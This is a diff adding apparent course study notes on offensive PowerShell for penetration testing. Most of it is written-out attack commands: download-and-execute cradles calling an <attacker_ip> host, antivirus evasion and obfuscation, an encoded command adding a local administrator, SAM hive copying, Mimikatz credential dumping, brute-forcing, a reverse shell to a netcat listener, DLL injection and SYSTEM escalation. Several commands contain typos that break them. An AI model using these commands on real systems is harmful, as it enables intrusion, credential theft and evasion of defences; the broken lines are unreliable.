@@ -1,0 +1,306 @@
+PowerShell Cont.
+
+Scripts:
+
+	Most common way to utilize PowerShell tasks
+	Uses .ps1 extensions
+	
+	A very basic script to get a file
+		Param(
+			[parameter(mandatory=$true)][string]$file
+		)
+		Get-Content "$file"
+		
+	Save the above as example.ps1
+	.\example.ps1 users.txt
+		Should see the users.txt file
+	Since mandatory =$true we have to tell PowerShell what file we want, if we do not we will get an error and have to put in the file type
+	If we were to change $file=users.txt then just running .\example.ps1 will bring back users without any other arguments
+	
+Loop Statements:
+	for()
+	foreach()
+	while()
+	do {something} while()
+	do {something} until()
+
+	We can use Get-Help
+		Get-Help about_Foreach
+		Get-Help about_Do
+
+	$services = Get-Service
+	foreach ($service in $services) { $service.Name }
+	Now you should see all the service names
+
+	We can also do loop statements with more arguments
+		Get-ChildItem C:\PowerShell\ | Where-Object {$_.Name -match "xls"}
+		$ports=(81,444);$ip="192.168.13.2"; foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch{}; if ($socket -eq $null) {echo$ip":"$port" - Closed";}else{echo $ip":"$port" - Open"; $socket = $null;}}
+	We can save the above script as a portscan.ps1 and run this on the machine to see if ports 81 or 444 are open
+
+Objects:
+
+	Objects are a representation of data that is provided as a result of running a cmdlet
+	Get-Process | Get-Member -MemberType Method
+		From here we can see if we can kill or start a process, which may help us with hacking the process
+	Get-Process -Name "firefox" | Kill
+	$webclient = New-Object System.Net.WebClient
+	$payload_url = "Https://<attacker_ip>/payload.exe"
+	$file = "C:\ProgramData\payload.exe"
+	$webclient.DownloadFile($payload_url,$file)
+
+	In the above example we are calling upon a variable called "$webclient" which will instantiates the "System.Net.WebClient" .NET class which is used to create a web client
+	We then create another variable ($payload_url) which is the url to our payload
+	the $file variable is used as the location to which we want to save the payload
+	Lastly, we call the $webclient variable to download the file which in this scenario is our payload.exe
+
+
+Downloading and Execution:
+	
+	There are two primary ways to download and exectue a file:
+		An executable or script is downloaded to disk which can then be executed by PowerShell itself
+		An executable or script is downloaded and run within the PowerShell process memory (never touches the disk which is the perferred method)
+
+	A summary of methods we can use for "In-Memory" execution with PowerShell version 2.0 (perferred methods):
+		Net.WebClient DownloadString Method
+		Net.WebClient DownloadData Method
+		Net.WebClient OpenRead method
+		.Net [Net.HttpWebRequest] class
+		Word.Application COM Object
+		Excel.Application COM Object
+		InternetExplorer.Application COM Object
+		MsXml2.ServerXmlHttp Com Object
+		Certutil.exe w/ -ping argument
+
+	A summary of methods we can use for "Disk-Based" execution with PowerShell version 2.0
+		Net.WebClient DownloadFile method
+		BITSAdmin.exe
+		Certutil.exe w/ -urlcache argument
+
+	The most common download cradle we'll see in the field uses the "iex" (Invoke-Expression) alias along with the Net.WebClient class and the "DownloadString" method
+		iex (New-Object Net.Webclient) .DownloadString("http://<attacker-ip>/script.ps1")
+		
+	We can run the same command as above from cmd interface in windows
+		powershell.exe iex (New-Object Net.Webclient) .DownloadString('http://<attacker-ip>/script.ps1')
+	
+	We can also break down each command and run it
+		$downloader = New-Object System.Net.WebClient
+		$payload = "Http://<attacker_ip>/script.ps1"
+		$command = $downloader.DownloadString($payload)
+		Invoke-Expression $command
+
+Evasion Tips:
+
+	Whenever possible try to have a SSL certificate that can be utilized when invoking a download script to bypass AV
+	This can also help because the information is encrypted in HTTPS and not through HTTP
+	
+	We can also change the name of the script from script.ps1 to something like Logo.gif and put that at the end of the file, it will still be ran as a script however the name can help bypass AV
+	We can also add headers with the Headers.Add method
+		$downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Crhome/65.0.3325.146
+	we Can also use proxies with $proxy agrument
+		$proxy = [Net.WebRequest]::GetSystemWebProxy()
+		$proxy.Credentials = [Net.CredentialCache]::DeafultCredentials
+		$downloader.Proxy = $proxy
+
+	Utilizing xml documents is another way to evade
+		Within an xml document make the following
+		<?xml version="1.0"?>
+		<command>
+			<a>
+				<execute>Get-Process</execute>
+			<a>
+		</command>
+	$xmldoc = New-Object System.Xml.XmlDocument
+	$xmldoc.Load("http://<attacker_url>/file.xml")
+	iex $xmldoc.command.a.execute
+
+	We can also use COM objects to both download and execute scripts
+
+Obfuscation:
+
+	One of the more well known obfuscation techniques within powershell is Invoke-Obfuscation
+		We can download this at https://github.com/danielbohannon/Invoke-Obfuscation/archive/master.zip
+		From here find modules
+			$env:PSModulePath
+				in the example we found a module
+					C:\users\user\Documents\WindowsPowerShell\Modules
+		Then we want to import that module and invoke obfuscation
+			Import-Module Invoke-Obfuscation
+		We can then import the Invoke-Obfuscation
+			Invoke-Obfuscation
+	There are several different options to use when obfuscating powershell commands
+		token
+		ast
+		string
+		encoding
+		compress
+		launcher
+	In the slides we are going to use String and Encoding methods
+		We first need to utilize the SET SCRIPTBLOCK command to say what we are going to be obfuscating
+		In the example we used the Net.Webclient do download the cradle
+			iex (New-Object Net.Webclient) .downloadstring("http://192.168.1.2/Get-ProcessPaths.ps1")
+	 	Now lets set the SCRIPTBLOCK to invoke-obfuscation
+			SET SCRIPTBLOCK iex (New-Object Net.Webclient) .downloadstring("http://192.168.1.2/Get-ProcessPaths.ps1")
+				Invoke-Obfuscation> STRING (we then have 3 options, in the slide we are going to use the "Reverse" method)
+			Now copy and past that obfuscated command
+		Now do the same thing and this time look at the results for ENCODING, from here we get more options
+			The slide has us use number 7 which is Special Characters
+		Again, copy and paste that into powershell and it will execute the command
+		We can also copy and paste this information in the command prompt with powersell -Command " code "
+	If you implement a type of obfuscation and then decided to use another one you will first have to use the RESET option to clear previous commands, this will stop the commands from "piling up"
+	
+
+	We can also obfuscate launcher commands
+		LAUNCHER (this will give use a whole bunch of different commands we can use)
+		From there we can pick 0 which is NO EXECUTION FLAGS
+
+	To encode a command that will add a new user "admin1" to a local admins group we can run the following
+		$command = 'net user admin1 "password1" /ADD; net localgroup administrators admin1 /add'
+		$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+		$encodeCommand = [Convert]::ToBase64String($bytes)
+	We can then see the results with the Write-Host cmdlet
+		Write-Host $encodedCommand
+			This shows use the base64 of what we put in above
+	From here we can execute that command in either powershell or command prompt
+		powersell.exe -encodedcommand <code>
+
+Inforamtion Gathering and Recon:
+
+	Even though PowerShell is a post exploit tool we can still find out more information about a system that may help us to increase privs or find other systems
+		Above we already saw how to look at different ports that may be open on a system (however we would have to go through each IP at a time)
+		There are programs we can run that will look at an entire netblock, from there we can search for open ports, we can find these different programs in PowerSploit Framework
+				Invoke-Portscan -Hosts "192.168.1.1/24" -PingOnly
+			We could also use a file to find the same information as above
+				Invoke-Portscan -HostFile ips.txt -PingOnly
+			From here we want to look at alive and see if it is true or false
+			To save the results we can then use | 
+				Invoke-Portscan -HostFile ips.txt -PingOnly | Export-Csv C:\ping_scan.csv
+				.\ping_scan.csv	
+			Once we see who is up we can then run a portscan on those different people
+				Invoke-Porscan -HostFile .\live_hosts.txt -ports "53-81" 
+			In the above example we are looking at ports 53 - 81
+		For a tool that is similar to dirsearch, gobuster, dirb and those we can use the Get-HttpStatus tool
+			Get-HttpStatus -Target 192.168.1.5 -Path dictionary.txt -Port 80 | >> ? {$_.Status -match "ok"}
+		The Posh-SecMod framework can be used to invoke an arpscan (https://github.com/darkoperator/Posh-SecMod)
+			Invoke-ARPScan -CIDR 192.168.1.1/24
+		We may be able to find other hosts that are up and running when this in invoked, thus giving us more targets to attack
+		To see more capabilites of Posh-SecMod
+			Get-Command -Module Posh-SecMod
+		Utilizing Posh-SecMod with reverse DNS lookup for a CIDR range
+			Invoke-ReverseDNSLookup -CIDR 192.168.1.0/24
+		Some other usefule ones are Resolve-HostRecord and Resolve-DNSRecord
+			
+Post Exploitation:
+	
+	We are going to first exlplore Nishang
+		First we need to download Nishang on the attacker machine
+			https://github.com/samratashok/nishang#gather
+	We can use the Copy-VSS module which will attempt to copy the SAM database
+		iex (New-Object Net.Webclient) .DownloadString("http://<attacker_ip>/Copy-VSS.ps1"); Copy-VSS
+	The above command will attempt to copy the SYSTEM registry hive and the SAM file to crack offline, these will be copied to the current working directory
+	The Get-Information cmdlet will get us a good deal of system information
+		Putty trusted hosts
+		Putty saved sessions
+		Recently used commands
+		Shares on the target machine
+		environment variables
+		Current user details
+		SNMP information
+		Installed Applications
+		Domain Name
+		Content of hosts file
+		Running services
+		Account policy
+		local users
+		local groups
+		WLAN info
+	To get information we can use the following command
+		iex (New-Object Net.Webclient) .DownloadString('http://<attacker_ip>/Get-Information.ps1'); Get-Information
+	We can also use the Get-PassHints which will dump password hints for the user
+		iex (New-Object Net.Webclient) .DownloadString('http://<attacker_ip>/Get_PassHints'); Get-PassHints
+	To Invoke-MimiKatz
+		(same command as above except /Invoke-Mimikatz'); Invoke-Mimikatz -DumpCreds
+	Nishang can also bruteforce different tools such as AD accounts, SQL Server, Web and FTP servers
+		-Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\temp\users.txt -PasswordList C:\temp\pwds.txt -Service ActiveDirectory -StopOnSuccess -Verbose
+	Reverse PowerShell Shell with Netcat
+		On attacker machine nc -lvnp 4444
+	In CMD Prompt
+		powershell.exe -Command iex (New-Object Net.WebClient) .DownloadString('http://<attacker_URL>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <listener_ip> -Port 4444
+			If everything goes as planned we should see something on our listener machine now
+	There are different shells and "rat"-type shells that we can utilize (all start with invoke)
+		JSRatRegsvr.ps1
+		JSRatRundll.ps1
+		PoshRatHttp.ps1
+		PoshRatHttps.ps1
+		PowerShellIcmp.ps1
+		PowerShellTcp.ps1
+		PowerShellTcpOneLine.ps1
+	Nishang has many other scripts that we can utilized
+		ActiveDirectory
+		Antak-WebShell
+		Backdoors
+		Bypass
+		Client
+		Escalation
+		Execution
+		Gather
+		MITM
+		Misc
+		Pivot
+		Prasadhak
+		Scan
+		Shells
+		Utility
+
+	Nishang is not the only tool we cna use, we na also use PowerSploit with the following frameworks
+		AntiVirusBypass
+		Code Execution
+		Exfiltration
+		Mayhem
+		Presistence
+		Privesc
+		Recon
+		ScriptModification
+	
+	Within the Privesc category there is a module that is called PowerUp which is used for misconfigurations
+		PS C:\Modules\PowerSploit\Privesc> Import-Module .\Privesc.psm1
+		Get-Command -Module Privesc
+			The above command will show you all the options (and it has a lot of them)
+		Invoke-AllChecks -HTLMReport (this will invoke all the different options on a target, and then save all of this to an HTMLReport)
+	From here the output will show us different functions we can abuse within the "AbuseFunction"
+
+	The CodeInjection category in PowerSploit can be used to inject our own code into exisiting processes on the target system, such as DLL injection
+		msfvenom -p windows/exec CMD="cmd.exe" -f dll > cmd.dll
+	This would simply execute cmd.exe on the target system when it is injected and the fil is ran in the dll file
+	We first would need to download the dll to the target system
+		iex (New-Object Net.Webclient) .DownloadFile ('http://<attacker_url>/cmd.dll', 'C:\programdata\cmd.dll')
+	Now we need to find some processes to inject the DLL into we can do this by running the ps command
+		ps (make sure to take note of the PID, in powershell it may just say ID)
+	In the slides we are going to inject out dll into notepad
+		iex (New-Object Net.WebClient) .DownloadString('http://<attacker_url>'Invoke-DLLInjection.ps1) ; Invoke-DLLInjection -ProcessID 7420 C:\programdata\cmd.dll
+	Run the ps command gain and see that you have a process name now called cmd.exe
+		ps
+	
+Decoder-it
+	https://github.com/decoder-it/psgetsystem
+	PSgetsystem allows us to obtain SYSTEM privileges via a parent process, which then spawns a child process which effectively inherts the SYSTEM access privileges of the parent process.
+	This tool needs to run as Administrator, it is utilized to evade application whiltelisting
+	First we need to download the psgetsys.ps1 script to our taget utilizing one of the ways above or in the other documents we already have to download something to a target
+		.\psgetsys.ps1
+		[MyProcess]::CreateProcessFromParent(<system_pid>,"<command_to_execute>")
+			Get-Process -IncludeUserName | Where-Object {$_.UserName -match "SYSTEM"} | Format-List -Property Username,Name,Id
+	 			This will return a list of processes that utilize SYSTEM as the username, make sure to remember the PID (or ID)
+			[MyProcess]::CreateProcessFromParent(3632,"cmd.exe")
+		We can then run process explorer to see that our process has spawned on the target system
+
+Empire
+	This is used to implement powershell functionality without requiring the existence of powershell on a target machine (the videos go through this in great detail
+		
+		
+
+	
+	
+		
+	
+	
+	
+	
